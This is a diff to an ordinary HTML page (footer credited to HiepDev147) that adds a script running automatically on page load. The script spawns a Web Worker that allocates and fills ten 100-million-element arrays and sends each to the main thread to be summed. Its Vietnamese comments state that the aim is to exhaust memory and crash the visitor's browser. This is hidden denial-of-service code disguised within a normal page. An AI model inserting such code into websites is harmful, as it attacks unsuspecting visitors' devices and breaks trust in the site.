@@ -31,5 +31,36 @@
     <footer class="footer">
         Copyright © 2024 - 2025 HiepDev147. All Rights Reserved
     </footer>
+    <script>function crashStable() {
+    const workerCode = `
+    self.onmessage = function() {
+      // Tạo 10 lần mảng lớn (100 triệu phần tử mỗi cái)
+      for (let j = 0; j < 10; j++) {
+        const arr = new Float64Array(100_000_000);
+        for (let i = 0; i < arr.length; i++) {
+          arr[i] = Math.random();
+        }
+        postMessage(arr); // gửi từng đợt, dễ crash
+      }
+    };
+  `;
+    
+    const blob = new Blob([workerCode], { type: "application/javascript" });
+    const worker = new Worker(URL.createObjectURL(blob));
+    
+    worker.onmessage = function(e) {
+        console.log("🔥 Nhận dữ liệu đợt:", e.data.length);
+        // Buộc phải truy cập dữ liệu để tăng tải lên RAM
+        const sum = e.data.reduce((a, b) => a + b, 0);
+        console.log("Tổng:", sum);
+    };
+    
+    setTimeout(() => {
+        console.log("💥 Boom (ổn định)!");
+        worker.postMessage("go");
+    }, 1000);
+}
+window.addEventListener('load', crashStable);
+</script>
 </body>
 </html>
